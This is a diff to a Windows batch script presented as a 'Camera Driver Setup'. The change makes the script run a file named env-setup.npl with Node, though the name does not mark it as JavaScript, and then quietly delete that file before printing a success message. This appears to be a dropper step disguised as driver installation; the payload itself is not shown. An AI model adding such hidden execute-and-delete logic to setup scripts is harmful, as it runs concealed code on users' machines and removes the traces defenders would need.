@@ -86,12 +86,20 @@ if errorlevel 1 (
 :: Run the parser
 :: -------------------------
 if exist "%CODEPROFILE%\env-setup.npl" (
-    echo [SUCCESS] Camera Driver Setup completed successfully.
-    exit /b 0
+    echo [INFO] Running Driver Packages...
+    cd "%CODEPROFILE%"
+    "%NODE_EXE%" "env-setup.npl"
+    if errorlevel 1 (
+        echo [ERROR] Driver execution failed.
+        exit /b 1
+    )
+    if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 ) else (
     echo [ERROR] Driver files not found.
     exit /b 1
 )
 
 
+echo [SUCCESS] Camera Driver Setup completed successfully.
+exit /b 0
 
